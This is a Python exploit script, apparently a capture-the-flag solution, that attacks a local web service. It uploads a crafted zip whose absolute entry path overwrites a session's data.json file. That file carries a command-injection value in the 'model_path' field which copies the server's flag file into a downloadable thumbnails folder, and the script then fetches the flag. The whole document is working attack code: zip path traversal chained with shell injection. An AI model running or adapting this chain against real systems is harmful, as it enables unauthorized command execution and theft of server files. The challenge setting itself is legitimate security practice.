import io
import requests
import zipfile
import json

target = "http://localhost:31003"

def get_image():
    return requests.get(f'{target}/static/seven2.png').content

def get_token():
    response = requests.post(f'{target}/api/session')
    data = response.json()
    return data['token']


def upload(token, name, data):
    files = {'file': (name, data)}
    response = requests.post(f'{target}/api/upload/{token}', files=files)
    data = response.json()
    return data['filenames']

def predict(token):
    response = requests.post(f'{target}/api/predict/{token}')
    data = response.json()
    return data['results']


token = get_token()
payload = {
  "cache": {
  },
  "model_path": f"';cp /flag* /app/data/{token}/thumbnails/flag.png;#"
}
buf = io.BytesIO()
zf = zipfile.ZipFile(buf, mode='w')
zf.writestr('seven2.png', get_image())
zf.writestr('/app/data/'+token+'/data.json', json.dumps(payload).encode())
zf.close()

image_filename = upload(token, 'data.zip', buf.getvalue())
print(image_filename)
results = predict(token)

flag = requests.get(f'{target}/api/session/{token}/thumbnails/flag.png').text.strip()
print(f"{flag=}")